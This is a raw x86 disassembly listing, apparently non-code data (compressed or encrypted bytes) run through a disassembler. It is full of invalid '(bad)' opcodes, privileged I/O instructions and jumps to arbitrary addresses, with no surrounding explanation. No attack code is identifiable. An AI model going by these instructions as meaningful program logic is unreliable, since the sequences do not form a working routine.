  42247f:	cdq    
  422480:	test   DWORD PTR [edx+0x6dd9f459],eax
  422486:	add    DWORD PTR [eax],eax
  422488:	add    eax,0xb9000001
  42248d:	fwait
  42248e:	out    dx,eax
  42248f:	or     BYTE PTR [edx-0x48a23fbb],0xeb
  422496:	stos   BYTE PTR es:[edi],al
  422497:	sahf   
  422498:	push   edx
  422499:	mov    ds,esp
  42249b:	sub    ah,ah
  42249d:	lods   eax,DWORD PTR ds:[esi]
  42249e:	and    al,0xf6
  4224a0:	sbb    eax,0x7410b55a
  4224a5:	stos   DWORD PTR es:[edi],eax
  4224a6:	adc    DWORD PTR [eax-0x41],ebp
  4224a9:	ret    
  4224aa:	jl     0x4224de
  4224ac:	add    al,0xb6
  4224ae:	test   BYTE PTR [ecx+esi*4-0x36d6405b],ch
  4224b5:	and    al,0x9c
  4224b7:	cmp    BYTE PTR [edx+ebx*8+0x2c],bh
  4224bb:	or     eax,edi
  4224bd:	test   al,0xb3
  4224bf:	hlt    
  4224c0:	sbb    esp,DWORD PTR [esp+ebx*4-0x58cfb4ce]
  4224c7:	out    dx,eax
  4224c8:	pop    es
  4224c9:	icebp  
  4224ca:	(bad)  
  4224cb:	and    ebx,ebx
  4224cd:	push   0xffffff85
  4224cf:	icebp  
  4224d0:	test   BYTE PTR [edi-0x40],0x96
  4224d4:	dec    ebx
  4224d5:	mov    bl,0xd3
  4224d7:	pop    edx
  4224d8:	dec    ebx
  4224d9:	pop    esi
  4224da:	mov    ch,0xfa
  4224dc:	stos   DWORD PTR es:[edi],eax
  4224dd:	pop    edx
  4224de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224df:	repz jo 0x422502
  4224e2:	jl     0x422539
  4224e4:	test   al,0x90
  4224e6:	mov    bh,BYTE PTR [edx-0xb105877]
  4224ec:	fmulp  st(4),st
  4224ee:	scas   al,BYTE PTR es:[edi]
  4224ef:	mov    cs,WORD PTR [esi-0x6b]
  4224f2:	pandn  mm7,QWORD PTR [ecx]
  4224f5:	into   
  4224f6:	mov    dh,0x17
  4224f8:	sub    DWORD PTR [ebp-0x4f],ebx
  4224fb:	add    eax,0xeead0a85
  422500:	or     edx,edi
  422502:	pop    edx
  422503:	aad    0x8c
  422505:	nop
  422506:	adc    BYTE PTR [edx-0x70e62c6c],0xf0
  42250d:	std    
  42250e:	dec    edx
  42250f:	(bad)  
  422511:	xlat   BYTE PTR ds:[ebx]
  422512:	pop    eax
  422513:	fnstcw WORD PTR [esi-0x317d0a21]
  422519:	call   0x1f9:0x464cac0d
  422520:	call   0x92a7:0x3ce78bfd
  422527:	jecxz  0x4224f7
  422529:	scas   eax,DWORD PTR es:[edi]
  42252a:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42252c:	push   cs
  42252d:	in     al,0xfb
  42252f:	adc    ecx,esp
  422531:	push   cs
  422532:	ins    BYTE PTR es:[edi],dx
  422533:	mov    cl,0xba
  422535:	fistp  DWORD PTR [ecx]
  422537:	pop    eax
  422538:	adc    DWORD PTR [ecx+esi*1-0x6162c85b],ecx
  42253f:	repz pop edx
  422541:	mov    esp,0x73d77593
  422546:	lahf   
  422547:	imul   eax,DWORD PTR [esi-0x7ee56b53],0x5667e22f
  422551:	push   ebp
  422552:	xrelease xchg DWORD PTR [eax+0x6e],ecx
  422556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422557:	ror    DWORD PTR [ebp+0x319fe94],1
  42255d:	pop    ecx
  42255e:	jae    0x42255a
  422560:	(bad)
  422563:	arpl   WORD PTR [eax+eiz*4+0x4d],cx
  422567:	mov    ch,0x3c
  422569:	addr16 inc eax
  42256b:	cwde   
  42256c:	cmp    eax,0xe6be2ed7
  422571:	cs dec edi
  422573:	(bad)  
  422574:	lahf   
  422575:	add    eax,0x2061a7ec
  42257a:	lahf   
  42257b:	sub    edi,DWORD PTR [edx+0x3e]
  42257e:	ret    
  42257f:	(bad)  
  422581:	pop    ds
  422582:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422583:	or     DWORD PTR [esi],esi
  422585:	xor    DWORD PTR [ecx+eiz*2-0xa],0xb2e3a89b
  42258d:	xchg   ebx,eax
  42258e:	adc    ch,BYTE PTR [ecx+0x47]
	...
  4225f1:	add    BYTE PTR [eax],al
  4225f3:	add    BYTE PTR [edx-0x40887052],bl
  4225f9:	ja     0x4225f5
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx+0x3581a2f8]
  422602:	adc    BYTE PTR [ebp-0x22],dl
  422605:	outs   dx,BYTE PTR ds:[esi]
  422606:	add    DWORD PTR [eax],eax
  422608:	add    eax,0xc9000001
  42260d:	mov    BYTE PTR [esi+0x38244453],dh
  422613:	lock sub ebx,DWORD PTR [ebp-0x56]
  422617:	cs sahf 
  422619:	xor    eax,0x77f8e02c
  42261e:	mov    dh,0xe5
  422620:	lods   al,BYTE PTR ds:[esi]
  422621:	pop    edi
  422622:	das    
  422623:	daa    
  422624:	sbb    BYTE PTR [esi],ah
  422626:	xor    esp,eax
  422628:	leave  
  422629:	xchg   ecx,eax
  42262a:	aam    0xac
  42262c:	lock inc edx
  42262e:	in     al,0x2a
  422630:	xor    al,BYTE PTR [eax+0x57ac6d88]
  422636:	xchg   esp,eax
  422637:	sub    cl,BYTE PTR [eax+0x17]
  42263a:	ja     0x422671
  42263c:	shr    edx,0x5b
  42263f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422640:	sub    eax,edi
  422642:	test   BYTE PTR [eax-0x1c7ce6a9],ch
  422648:	das    
  422649:	cmp    esi,edi
  42264b:	ja     0x4226b5
  42264d:	sbb    DWORD PTR [edx+0x1b96d293],ebp
  422653:	or     al,cl
  422655:	lahf   
  422656:	jmp    0x205b513
  42265b:	push   esp
  42265c:	mov    ebx,0x9921c8c3
  422661:	pop    edi
  422662:	inc    esp
  422663:	and    dl,al
  422665:	inc    eax
  422666:	sbb    bh,ch
  422668:	xchg   ah,dh
  42266a:	pop    edi
  42266b:	xchg   ecx,eax
  42266c:	mov    ecx,0xe8fabbb7
  422671:	push   ss
  422672:	addr16 inc esi
  422674:	rol    BYTE PTR [eax+0x3e],cl
  422677:	jmp    0xca40:0xc5263278
  42267e:	aas    
  42267f:	pop    esp
  422680:	dec    ecx
  422681:	stos   BYTE PTR es:[edi],al
  422682:	push   eax
  422684:	add    DWORD PTR [edx-0x320123bf],esp
  42268a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42268b:	mov    cl,0xe
  42268d:	mov    bh,0xb6
  42268f:	mov    eax,ds:0xe248cdb8
  422694:	dec    ebx
  422695:	cs das 
  422697:	add    DWORD PTR [ebx],esi
  422699:	dec    ebp
  42269a:	sbb    DWORD PTR [esp+eax*8-0x5e],0xfffffffa
  42269f:	cmp    ebp,DWORD PTR [esi+0x684590f0]
  4226a5:	sub    ebp,DWORD PTR [edx-0x24a40d5d]
  4226ab:	dec    ecx
  4226ac:	fadd   QWORD PTR [eax+ebp*1+0x3a]
  4226b0:	dec    edx
  4226b1:	imul   BYTE PTR [ebp+0x28]
  4226b4:	jp     0x4226d7
  4226b6:	dec    esi
  4226b7:	pop    ss
  4226b8:	and    ebx,DWORD PTR [esi+0x42]
  4226bb:	sub    ebx,ebp
  4226bd:	mov    ds:0x56a0ad98,al
  4226c2:	pop    ds
  4226c3:	leave  
  4226c4:	jae    0x42266f
  4226c6:	in     eax,0xa4
  4226c8:	retf   
  4226c9:	ja     0x422716
  4226cb:	push   edx
  4226cc:	jmp    0x1eaf804d
  4226d1:	pop    edx
  4226d2:	test   eax,0xa97223f8
  4226d7:	mov    dl,0x6c
  4226d9:	repnz shr dh,cl
  4226dc:	imul   ebx,DWORD PTR [edx+0x74],0x6eedcaa1
  4226e3:	cld    
  4226e4:	xchg   esp,eax
  4226e5:	mov    bh,0x6e
  4226e7:	push   ecx
  4226e8:	in     eax,dx
  4226e9:	jle    0x422765
  4226eb:	adc    eax,0x7f47fe0b
  4226f0:	imul   edi,DWORD PTR [edi],0x20cf10c
  4226f6:	fs inc esi
  4226f8:	test   eax,0xbe6f26ba
  4226fd:	in     eax,dx
  4226fe:	imul   eax,DWORD PTR [edx],0xddb070d7
  422704:	cwd    
  422706:	enter  0x8357,0xf1
  42270a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42270b:	in     eax,dx
  42270c:	ins    BYTE PTR es:[edi],dx
  42270d:	cwde   
  42270e:	jmp    DWORD PTR [eax+0x17]
	...
  422771:	add    BYTE PTR [eax],al
  422773:	add    BYTE PTR [edi],ah
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0x797f01c8
  422781:	call   FWORD PTR [eax+0x16fe3b8]
  422787:	add    BYTE PTR ds:0xfa000001,al
  42278d:	inc    eax
  42278e:	adc    al,0xa9
  422790:	in     al,0xc2
  422792:	fstp   DWORD PTR [ebx+0x7f74484d]
  422798:	sbb    al,0xb1
  42279a:	fs hlt 
  42279c:	push   ecx
  42279d:	pop    ds
  42279e:	outs   dx,DWORD PTR ds:[esi]
  42279f:	dec    ecx
  4227a0:	sub    BYTE PTR [ebp+edi*1+0x7d],0xd
  4227a5:	adc    ah,ah
  4227a7:	adc    esi,DWORD PTR [edi]
  4227a9:	mov    WORD PTR [edx+0x5d],fs
  4227ac:	mov    gs,WORD PTR [ebp-0x60]
  4227af:	xchg   esp,eax
  4227b0:	in     eax,0x5b
  4227b2:	mov    ebp,edx
  4227b4:	fistp  QWORD PTR [eax+ecx*4+0x73]
  4227b8:	lods   al,BYTE PTR ds:[esi]
  4227b9:	js     0x4227b5
  4227bb:	out    dx,al
  4227bc:	add    eax,0xe84ef795
  4227c1:	hlt    
  4227c2:	inc    ebp
  4227c3:	das    
  4227c4:	psubd  mm7,QWORD PTR [esi-0x10]
  4227c8:	les    esp,FWORD PTR [ecx]
  4227ca:	call   0x430b2907
  4227cf:	int    0x75
  4227d1:	pop    ds
  4227d2:	fwait
  4227d3:	cld    
  4227d4:	data16 hlt 
  4227d6:	sub    BYTE PTR [edx+0x18b0310f],0xa2
  4227dd:	push   ds
  4227de:	in     eax,dx
  4227df:	jl     0x42284b
  4227e1:	jne    0x422797
  4227e3:	jl     0x42278e
  4227e5:	xor    eax,DWORD PTR [ecx+0x569deae0]
  4227eb:	mov    al,0xab
  4227ed:	popa   
  4227ee:	jg     0x422854
  4227f0:	adc    DWORD PTR [esi-0x78],eax
  4227f3:	daa    
  4227f4:	or     DWORD PTR [edi-0x41838c3d],ebx
  4227fa:	pop    esp
  4227fb:	rcl    DWORD PTR [ebp-0x4c],cl
  4227fe:	dec    eax
  4227ff:	mov    dh,ch
  422801:	scas   eax,DWORD PTR es:[edi]
  422802:	push   ds
  422803:	jbe    0x422854
  422805:	loopne 0x4227bc
  422807:	pop    ebx
  422808:	mov    bh,0x95
  42280a:	in     eax,dx
  42280b:	sbb    BYTE PTR [ecx],bl
  42280d:	xchg   edx,eax
  42280e:	xchg   ecx,eax
  42280f:	mov    cl,BYTE PTR [ecx+ecx*2+0x3a343279]
  422816:	or     al,0x91
  422818:	xlat   BYTE PTR ds:[ebx]
  422819:	lods   al,BYTE PTR ds:[esi]
  42281a:	cmp    ch,bl
  42281c:	sub    ah,al
  42281e:	mov    eax,ds:0x50f938ea
  422823:	test   eax,0x5322cc71
  422828:	pushf  
  422829:	in     eax,0x1b
  42282b:	mov    edx,DWORD PTR [ecx-0x2a2d9071]
  422831:	std    
  422832:	(bad)  
  422833:	jg     0x4227f4
  422835:	pop    edi
  422836:	dec    ecx
  422837:	pop    esi
  422838:	jmp    0x4227c2
  42283a:	xlat   BYTE PTR ds:[ebx]
  42283b:	sub    cl,BYTE PTR [ebx-0xc57f21a]
  422841:	jle    0x4228b5
  422843:	iret   
  422844:	lea    ebx,[ecx]
  422846:	xchg   edi,eax
  422847:	loope  0x42285a
  422849:	mov    eax,0xab6e96e7
  42284e:	lea    ebp,[eax-0x321d9455]
  422854:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422855:	mov    eax,0x90273bb9
  42285a:	pop    ebp
  42285b:	leave  
  42285c:	rol    BYTE PTR cs:[edi+ebp*1+0x6e],0x2b
  422862:	dec    ecx
  422863:	xchg   ebp,esi
  422865:	fnsave [edx-0x36b9a13]
  42286b:	sbb    dh,BYTE PTR [edi+0x95984da]
  422871:	mov    ebx,0xe8a258ef
  422876:	stos   BYTE PTR es:[edi],al
  422877:	dec    edx
  422878:	xor    bl,BYTE PTR [esi+0xb]
  42287b:	ror    BYTE PTR [edx-0x9],cl
  42287e:	test   al,0xf4
  422880:	xchg   esi,eax
  422881:	ss in  eax,dx
  422883:	jmp    0x422805
  422885:	sub    al,0x5e
  422887:	add    bh,BYTE PTR [ecx-0x2ed9d7bb]
  42288d:	push   ds
  42288e:	mov    bh,0x78
  422890:	je     0x422892
	...
  4228f2:	add    BYTE PTR [eax],al
  4228f4:	int    0x39
  4228f6:	mov    eax,0xef97fc97
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x422914
  422901:	mov    esi,0x70e84ed8
  422906:	add    DWORD PTR [eax],eax
  422908:	add    eax,0x19000001
  42290d:	adc    eax,0x8f70431c
  422912:	dec    ebp
  422913:	shl    DWORD PTR [ebx+0x269a006c],cl
  422919:	test   ebx,0x4cbe6cc9
  42291f:	push   0x19
  422921:	xor    bh,BYTE PTR [ecx+0x5f5d619f]
  422927:	shl    BYTE PTR [edx-0x5],cl
  42292a:	pop    es
  42292b:	inc    eax
  42292c:	push   es
  42292d:	popf   
  42292e:	fucomp st(2)
  422930:	inc    ecx
  422931:	jp     0x4228b3
  422933:	(bad)  
  422934:	jnp    0x4228ba
  422936:	data16 int3 
  422938:	xchg   edx,eax
  422939:	mov    al,ds:0xdd2c4787
  42293e:	mov    eax,ds:0xe1cd4392
  422943:	inc    esi
  422944:	and    ah,bl
  422946:	cmp    ecx,DWORD PTR [eax]
  422948:	sar    DWORD PTR [ebx],1
  42294a:	dec    ebp
  42294b:	adc    DWORD PTR [edx],ebx
  42294d:	add    al,0xf6
  422950:	pop    ecx
  422951:	imul   esi,esp,0x4d
  422954:	jecxz  0x42293f
  422956:	mov    cl,0x11
  422958:	adc    DWORD PTR [eax-0x53df4480],esi
  42295e:	test   eax,0x6406753d
  422963:	mov    bh,0xd7
  422965:	mov    eax,ds:0x6a8ae399
  42296a:	jge    0x422974
  42296c:	aad    0x49
  42296e:	push   edi
  42296f:	adc    BYTE PTR [ebx],bh
  422971:	mov    bh,0xc3
  422973:	jmp    0x4229d5
  422975:	mov    cx,0x79a7
  422979:	sbb    eax,0x755f2a1
  42297e:	psllw  mm1,QWORD PTR [esi]
  422981:	std    
  422982:	(bad)
  422985:	sub    al,0x8
  422987:	jbe    0x422912
  422989:	or     eax,0x7a28c053
  42298e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42298f:	jnp    0x422970
  422991:	pop    eax
  422992:	mov    ds:0x7deaa756,eax
  422997:	aas    
  422998:	adc    al,0x39
  42299a:	cwde   
  42299b:	and    edi,DWORD PTR [edx-0x3b1f7fc7]
  4229a1:	push   esi
  4229a2:	mov    al,0x17
  4229a4:	push   ebx
  4229a5:	sbb    ebp,DWORD PTR [esi-0x6f]
  4229a8:	dec    eax
  4229a9:	mov    ah,0xe4
  4229ab:	jno    0x4229f9
  4229ad:	inc    eax
  4229ae:	adc    edx,DWORD PTR [edi+ebx*2+0x7c]
  4229b2:	dec    eax
  4229b3:	std    
  4229b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229b5:	stos   BYTE PTR es:[edi],al
  4229b6:	xchg   edi,eax
  4229b7:	mov    ds:0xdb8c514f,eax
  4229bc:	xchg   edi,eax
  4229bd:	fsub   DWORD PTR [ecx]
  4229bf:	in     al,0x4c
  4229c1:	lock jo 0x4229f6
  4229c4:	inc    ebx
  4229c5:	loop   0x4229dc
  4229c7:	int    0xf8
  4229c9:	xor    eax,0xcf7ba44b
  4229ce:	add    ebx,DWORD PTR [ebp+0xf]
  4229d1:	std    
  4229d2:	sti    
  4229d3:	sub    ecx,edi
  4229d5:	push   edi
  4229d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229d7:	mov    BYTE PTR [edi-0x1e71cf29],dh
  4229dd:	pop    es
  4229de:	arpl   WORD PTR [ecx],si
  4229e0:	stc    
  4229e1:	xor    BYTE PTR [edx+0x4b33e4b9],bl
  4229e7:	xchg   ebx,eax
  4229e8:	cwde   
  4229e9:	pop    eax
  4229ea:	mov    ds:0xa625e000,al
  4229ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229f0:	sahf   
  4229f1:	fstp   TBYTE PTR [esi]
  4229f3:	mov    ah,0x9
  4229f5:	xor    ch,BYTE PTR [esi*2-0x4fc8c4ce]
  4229fc:	sbb    BYTE PTR [ecx],cl
  4229fe:	loope  0x422a4a
  422a00:	cmp    bh,BYTE PTR [esi-0x24]
  422a03:	sub    al,0x1d
  422a05:	jle    0x4229fd
  422a07:	sub    BYTE PTR [esi-0x3c8be07b],dh
  422a0d:	leave  
  422a0e:	xchg   dh,bh
  422a10:	pop    ds
	...
  422a71:	add    BYTE PTR [eax],al
  422a73:	add    BYTE PTR [esi-0x377e796],dl
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	add    DWORD PTR [edx+0x71ed75cb],edi
  422a86:	add    DWORD PTR [eax],eax
  422a88:	add    eax,0xcb000001
  422a8d:	jmp    0x422a28
  422a8f:	mov    ebp,0x563b8b43
  422a94:	mov    ch,0x8f
  422a96:	in     al,0x9f
  422a98:	fs push esi
  422a9a:	shr    DWORD PTR [edi],cl
  422a9c:	add    BYTE PTR [edx-0x54f47380],0x97
  422aa3:	mov    ds,WORD PTR [esi+0x654268a0]
  422aa9:	test   al,0x4c
  422aab:	ja     0x422b13
  422aad:	sub    DWORD PTR [esi-0x6b],esi
  422ab0:	dec    eax
  422ab1:	mov    ebx,0xde400a2d
  422ab6:	ret    0xcd27
  422ab9:	fdivr  DWORD PTR [edx]
  422abb:	pop    ebp
  422abc:	sahf   
  422abd:	cmc    
  422abe:	mov    eax,0x6b537bd6
  422ac3:	outs   dx,DWORD PTR ds:[esi]
  422ac4:	repnz or DWORD PTR [eax+0x3d89c243],esp
  422acb:	xor    BYTE PTR [edx+0x52f70794],bl
  422ad1:	mov    ds:0x7137ecce,eax
  422ad6:	sar    ah,1
  422ad8:	xor    al,0x5d
  422ada:	ror    dl,cl
  422adc:	popf   
  422add:	dec    eax
  422ade:	xchg   ebp,eax
  422adf:	or     ebx,DWORD PTR [edx+edx*1+0x7569fcd1]
  422ae6:	and    esi,DWORD PTR [ecx]
  422ae8:	adc    BYTE PTR [ebp+0x3c],bh
  422aeb:	push   es
  422aec:	xchg   edi,eax
  422aed:	arpl   WORD PTR [edi+ebp*1],si
  422af0:	(bad)  
  422af1:	fwait
  422af2:	arpl   cx,bp
  422af4:	mov    ebp,0x1f23e4b7
  422af9:	jmp    0x422b40
  422afb:	and    DWORD PTR [ebx+0x5],esp
  422afe:	xchg   BYTE PTR [ebp+0x2c005988],cl
  422b04:	mov    eax,ds:0xd3ee679e
  422b0a:	jle    0x422ae5
  422b0c:	xchg   esp,eax
  422b0d:	cmp    BYTE PTR [eax+eax*1-0x1e4f3d93],dl
  422b14:	pop    ebx
  422b15:	mov    ch,cl
  422b17:	fdivr  DWORD PTR [esi-0x474c5071]
  422b1d:	mov    edx,0x28250815
  422b22:	cmp    eax,0xcff157e7
  422b27:	lods   al,BYTE PTR ds:[esi]
  422b28:	imul   esp,ebx,0xce9b0ade
  422b2e:	sub    DWORD PTR [bx+di-0x76],ecx
  422b32:	mov    al,ds:0xfade22f0
  422b37:	lock mov eax,0x86b1fbc3
  422b3d:	add    ebx,DWORD PTR [ecx-0xc0de807]
  422b43:	mov    esp,ebx
  422b45:	imul   ebx,DWORD PTR [edi+0x0],0x3a
  422b49:	and    ebx,DWORD PTR [ebx+0x25ccbf49]
  422b4f:	loope  0x422bc3
  422b51:	fstp   TBYTE PTR [esi]
  422b53:	inc    esi
  422b54:	out    dx,al
  422b55:	mov    esi,0x24061496
  422b5a:	mov    dh,0xa9
  422b5c:	cli    
  422b5d:	push   edi
  422b5e:	mov    bh,0x7c
  422b60:	xchg   DWORD PTR [ecx-0x30],ebp
  422b63:	(bad)  
  422b64:	xor    edi,DWORD PTR [edi]
  422b66:	mov    cs,WORD PTR [edi]
  422b68:	cwde   
  422b69:	leave  
  422b6a:	(bad)  
  422b6b:	sbb    cl,ch
  422b6d:	(bad)  
  422b6f:	hlt    
  422b70:	push   es
  422b71:	jo     0x422bad
  422b73:	sar    bl,1
  422b75:	mov    dl,0xf6
  422b77:	mov    esi,0xe8ca3c4f
  422b7c:	mov    cl,0x3f
  422b7e:	push   ds
  422b7f:	dec    esi
  422b80:	into   
  422b81:	inc    eax
  422b82:	arpl   WORD PTR [ecx+esi*4],di
  422b85:	nop
  422b86:	stc    
  422b87:	(bad)  
  422b88:	sub    eax,0x61f2b932
  422b8d:	and    dh,al
  422b8f:	cmp    eax,DWORD PTR [eax+0x0]
	...
  422bf2:	add    BYTE PTR [eax],al
  422bf4:	inc    esp
  422bf5:	aaa    
  422bf6:	dec    edx
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx+0x57b84d9c]
  422c02:	dec    eax
  422c03:	pop    ds
  422c04:	bnd jb 0x422c08
  422c07:	add    BYTE PTR ds:0x5e000001,al
  422c0d:	inc    edi
  422c0e:	jmp    0xff0d0dfc
  422c13:	mov    ch,0x88
  422c15:	mov    DWORD PTR [edi],ebx
  422c17:	xor    ebx,DWORD PTR [ecx-0x64b5401b]
  422c1d:	cmp    al,0x15
  422c1f:	rol    BYTE PTR es:[ebx+0x10b7dcfc],0x41
  422c27:	loope  0x422bdf
  422c29:	aaa    
  422c2a:	imul   edx,DWORD PTR [edx-0xf],0xe6b3e104
  422c31:	iret   
  422c32:	rcr    eax,1
  422c34:	(bad)  
  422c35:	pop    ebx
  422c36:	and    BYTE PTR [ebp+0x4dfddbc3],bl
  422c3c:	js     0x422c11
  422c3e:	sub    dh,BYTE PTR [esi-0x5c39d164]
  422c44:	cs out 0x4,al
  422c47:	xchg   ecx,eax
  422c48:	aam    0x56
  422c4a:	push   ecx
  422c4b:	popa   
  422c4c:	in     eax,dx
  422c4d:	or     al,0xc0
  422c4f:	scas   al,BYTE PTR es:[edi]
  422c50:	adc    eax,0x6abfa11
  422c55:	call   0xe76e:0x5105f149
  422c5c:	and    eax,0x728de4d0
  422c61:	adc    cl,bl
  422c63:	enter  0xc997,0x62
  422c67:	and    ebp,DWORD PTR [eax+eax*4]
  422c6a:	cmp    BYTE PTR [edi-0x45e94672],ah
  422c70:	sbb    DWORD PTR [esi-0x278ea3c2],ecx
  422c76:	outs   dx,BYTE PTR ds:[esi]
  422c77:	dec    edi
  422c78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c79:	and    al,0xa8
  422c7b:	mov    edi,0x68bb707a
  422c80:	mov    edi,0x81281e6b
  422c85:	jg     0x422d01
  422c87:	ins    DWORD PTR es:[edi],dx
  422c88:	ja     0x422c4c
  422c8a:	xchg   DWORD PTR [ecx],eax
  422c8c:	inc    ebx
  422c8d:	adc    BYTE PTR [edx+0x3e],0x0
  422c91:	lods   al,BYTE PTR ds:[esi]
  422c92:	imul   BYTE PTR [edi+0x6eeb037a]
  422c98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c99:	xor    BYTE PTR [esi+0x7f],ch
  422c9c:	ror    DWORD PTR [ebx+0x12ab9a46],1
  422ca2:	xlat   BYTE PTR ds:[ebx]
  422ca3:	pop    esp
  422ca4:	repnz mov eax,0x2d37e428
  422caa:	repnz cmp BYTE PTR [ebx],dl
  422cad:	xchg   esi,eax
  422cae:	mov    bh,0xd4
  422cb0:	(bad)  
  422cb2:	sbb    BYTE PTR [ecx],ah
  422cb4:	icebp  
  422cb5:	repnz adc edi,DWORD PTR [ebx+eiz*8+0x61]
  422cba:	test   BYTE PTR ds:0xf2effdcc,al
  422cc0:	push   ss
  422cc1:	pushf  
  422cc2:	cmp    BYTE PTR [eax],ch
  422cc4:	fnstcw WORD PTR [ecx+0x10]
  422cc7:	jecxz  0x422c91
  422cc9:	arpl   cx,dx
  422ccb:	push   ebp
  422ccc:	(bad)  
  422ccd:	push   0xfffffff6
  422ccf:	xchg   ebx,eax
  422cd0:	inc    esp
  422cd1:	fcmovnu st,st(4)
  422cd3:	fidivr WORD PTR [esi-0x64]
  422cd6:	push   eax
  422cd7:	jge    0x422c9f
  422cd9:	inc    ecx
  422cda:	nop
  422cdb:	push   cs
  422cdc:	cmp    al,BYTE PTR [ebp-0x1a]
  422cdf:	sti    
  422ce0:	lahf   
  422ce1:	jecxz  0x422c84
  422ce3:	stos   DWORD PTR es:[edi],eax
  422ce4:	or     eax,edi
  422ce6:	int3   
  422ce7:	jmp    0x90b:0xb44022ee
  422cee:	and    al,0xf0
  422cf0:	add    al,0xe7
  422cf2:	addr16 inc edi
  422cf4:	jp     0x422d19
  422cf6:	popf   
  422cf7:	ret    
  422cf8:	add    eax,edx
  422cfa:	repnz dec ecx
  422cfc:	xchg   ebp,eax
  422cfd:	xchg   edi,eax
  422cfe:	test   al,0x10
  422d00:	je     0x422ce2
  422d02:	push   es
  422d03:	out    dx,al
  422d04:	xchg   ecx,eax
  422d05:	mov    edi,0x424e7269
  422d0a:	xchg   edi,eax
  422d0b:	mov    ebp,0x4c2b225a
  422d10:	outs   dx,DWORD PTR ds:[esi]
	...
  422d71:	add    BYTE PTR [eax],al
  422d73:	add    BYTE PTR [edi+0x626d60bd],bh
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    edi,edi
  422d81:	fiadd  WORD PTR [edi]
  422d83:	jp     0x422d7c
  422d85:	jae    0x422d88
  422d87:	add    BYTE PTR ds:0xf6000001,al
  422d8d:	(bad)  
  422d8f:	dec    edi
  422d90:	xchg   DWORD PTR [edx+esi*4],esi
  422d93:	mov    ebp,0xa82af4e9
  422d98:	fs rcl BYTE PTR gs:[eax],cl
  422d9c:	mov    ah,0xdd
  422d9e:	adc    al,0xa0
  422da0:	not    al
  422da2:	fstp   DWORD PTR [ecx]
  422da4:	push   ecx
  422da5:	(bad)  
  422da6:	mov    ebx,0x13865a47
  422dab:	add    al,0xae
  422dad:	cld    
  422dae:	fdivr  st(0),st
  422db0:	stos   BYTE PTR es:[edi],al
  422db1:	and    dh,BYTE PTR [esi]
  422db3:	js     0x422d7b
  422db5:	cmp    DWORD PTR [edx-0x46],ebx
  422db8:	(bad)  
  422db9:	in     al,dx
  422dba:	jns    0x422dff
  422dbc:	out    dx,eax
  422dbd:	imul   eax,DWORD PTR ss:[edi-0x9],0x31
  422dc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422dc3:	or     bl,ch
  422dc5:	push   eax
  422dc6:	ja     0x422dda
  422dc8:	sbb    ah,0x5f
  422dcb:	aam    0x4f
  422dcd:	pop    ss
  422dce:	je     0x422dd1
  422dd0:	xor    al,0xae
  422dd2:	sbb    esp,ebp
  422dd4:	mov    dh,0xbf
  422dd6:	in     eax,dx
  422dd7:	push   ebp
  422dd8:	jmp    0xf13f:0x4804fffb
  422ddf:	fiadd  WORD PTR [edi]
  422de1:	daa    
  422de2:	pop    ds
  422de3:	push   ds
  422de4:	add    eax,0xc1d291b
  422de9:	stos   DWORD PTR es:[edi],eax
  422dea:	cmp    BYTE PTR [eax-0x3e361f45],ch
  422df0:	idiv   BYTE PTR [edx+0xee6c45b]
  422df6:	(bad)  
  422df7:	mov    eax,0xb911c2f3
  422dfc:	pusha  
  422dfd:	push   ebp
  422dfe:	loop   0x422e4e
  422e00:	(bad)  
  422e01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e02:	fiadd  WORD PTR [ecx]
  422e04:	inc    esp
  422e05:	cmp    al,0xed
  422e07:	xchg   esi,eax
  422e08:	xlat   BYTE PTR ds:[ebx]
  422e09:	out    dx,eax
  422e0a:	shl    BYTE PTR ds:0x6603bb08,0x6
  422e11:	mov    cl,0xf8
  422e13:	push   0x87fe7c7c
  422e18:	mov    dl,BYTE PTR [edi]
  422e1a:	jecxz  0x422ddf
  422e1c:	cmp    DWORD PTR [ebp-0x54ea1d7c],eax
  422e22:	out    dx,al
  422e23:	mov    ax,0x221c
  422e27:	cmp    al,0x2b
  422e29:	add    cl,BYTE PTR [ecx+eiz*1+0x79]
  422e2d:	(bad)  
  422e2e:	mov    dl,0xea
  422e30:	rcl    DWORD PTR [ecx-0x736d26ca],0x94
  422e37:	(bad)  
  422e39:	push   edi
  422e3a:	(bad)  
  422e3b:	push   cs
  422e3c:	mov    bh,0x17
  422e3e:	jl     0x422de9
  422e40:	stc    
  422e41:	fwait
  422e42:	stos   DWORD PTR es:[edi],eax
  422e43:	shl    BYTE PTR [ecx-0x6c852d69],1
  422e49:	mov    ds:0xba6c22d4,eax
  422e4e:	gs push cs
  422e50:	ins    DWORD PTR es:[edi],dx
  422e51:	sti    
  422e52:	mov    ah,0x68
  422e54:	mov    WORD PTR [edx],ds
  422e56:	sbb    BYTE PTR [edx+0x43],dh
  422e59:	outs   dx,DWORD PTR ds:[esi]
  422e5a:	xchg   ecx,eax
